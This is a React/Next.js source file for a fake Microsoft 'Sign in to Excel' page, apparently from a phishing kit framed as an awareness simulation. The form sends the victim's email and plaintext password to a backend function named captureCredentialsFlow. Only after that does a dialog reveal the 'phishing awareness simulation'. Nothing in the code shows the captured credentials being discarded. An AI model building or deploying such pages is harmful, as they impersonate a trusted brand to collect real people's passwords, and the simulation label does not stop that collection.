'use client';
import { FormEvent, useState } from 'react';
import { ai } from '@/ai/genkit';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from '@/components/ui/alert-dialog';
import { ShieldX } from 'lucide-react';
import { PlaceHolderImages } from '@/lib/placeholder-images';
import Image from 'next/image';

export default function SharePointLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await ai.flow.captureCredentialsFlow({ username, password });
    setShowAlert(true);
  };

  return (
    <div className="relative flex items-center justify-center min-h-screen">
      {bgImage && (
        <Image
          src={bgImage.imageUrl}
          alt={bgImage.description}
          data-ai-hint={bgImage.imageHint}
          fill
          style={{ objectFit: 'cover' }}
          className="absolute inset-0 z-0"
        />
      )}
      <Card className="w-[380px] bg-white/95 text-center shadow-2xl z-10">
        <CardHeader>
          <CardTitle className="text-2xl text-[#217346]">
            Sign in to Excel
          </CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} autoComplete="off" className="space-y-4">
            <Input
              type="text"
              name="username"
              placeholder="Email or phone"
              required
              autoComplete="off"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              className="w-full p-3 border-gray-300 rounded-md text-base"
            />
            <Input
              type="password"
              name="password"
              placeholder="Password"
              required
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-3 border-gray-300 rounded-md text-base"
            />
            <Button
              type="submit"
              className="w-full p-3 mt-2 bg-[#217346] text-white font-bold rounded-md hover:bg-green-800"
            >
              Sign in
            </Button>
          </form>
          <div className="mt-4 text-xs text-gray-600">
            © Microsoft Corporation
          </div>
        </CardContent>
      </Card>

      <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
        <AlertDialogContent className="text-center">
          <AlertDialogHeader>
            <div className="flex justify-center mb-4">
              <ShieldX className="w-16 h-16 text-red-500" />
            </div>
            <AlertDialogTitle className="text-2xl">This Link Has Expired</AlertDialogTitle>
          </AlertDialogHeader>
          <AlertDialogDescription>
            This page was part of a phishing awareness simulation. In a real scenario, a link might expire for security reasons.
            <p className="mt-4 text-sm text-muted-foreground">
              Always be cautious of unexpected login requests.
            </p>
          </AlertDialogDescription>
          <AlertDialogFooter className="sm:justify-center">
            <AlertDialogAction onClick={() => setShowAlert(false)}>
              Continue
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
}
